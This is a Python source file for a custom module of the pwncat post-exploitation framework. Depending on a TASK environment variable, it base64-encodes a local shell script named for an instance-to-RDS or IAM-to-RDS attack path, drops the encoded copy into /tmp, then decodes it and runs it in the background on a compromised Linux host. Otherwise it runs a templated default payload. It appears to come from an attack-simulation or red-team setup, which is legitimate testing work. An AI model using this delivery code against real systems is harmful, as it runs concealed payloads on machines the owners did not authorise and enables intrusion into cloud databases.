#!/usr/bin/env python3
from io import StringIO
import os 
import time
from pwncat import util
from pwncat.modules import Status, BaseModule, ModuleFailed, Argument
from pwncat.manager import Session
from pwncat.platform.linux import Linux
from pathlib import Path
import base64


class Module(BaseModule):
    """ Sample custom module """

    """
    Usage: run sample 
    """
    PLATFORM = [Linux]
    ARGUMENTS = {}

    def run(self, session: Session):
        yield Status( "preparing to pwn the [red]world[/red]")
        script_dir = os.path.dirname(os.path.realpath(__file__))
        session.log(f"script dir: {script_dir}")
        task_name = session.platform.getenv("TASK")
        session.log(f"task environment: {task_name}")
        if task_name == "instance2rds":
            session.log(f"reading payload: {script_dir}/../resources/instance2rds.sh")
            try:
                payload = base64.b64encode(Path(f'{script_dir}/../resources/instance2rds.sh').read_bytes())
                session.log("payload loaded and ready")
                result = session.platform.run(f"/bin/bash -c 'echo {payload.decode()} | tee /tmp/payload_instance2rds | base64 -d | /bin/bash &'")
                session.log(result)
            except Exception as e:
                session.log(f"error: {e}")
        elif task_name == "iam2rds":
            session.log(f"reading payload: {script_dir}/../resources/iam2rds.sh")
            try:
                payload = base64.b64encode(Path(f'{script_dir}/../resources/iam2rds.sh').read_bytes())
                session.log("payload loaded and ready")
                result = session.platform.run(f"/bin/bash -c 'echo {payload.decode()} | tee /tmp/payload_iam2rds | base64 -d | /bin/bash &'")
                session.log(result)
            except Exception as e:
                session.log(f"error: {e}")
        else:
            result = session.platform.run("${default_payload}")
            session.log(result)

        session.log( f"ran {self.name}")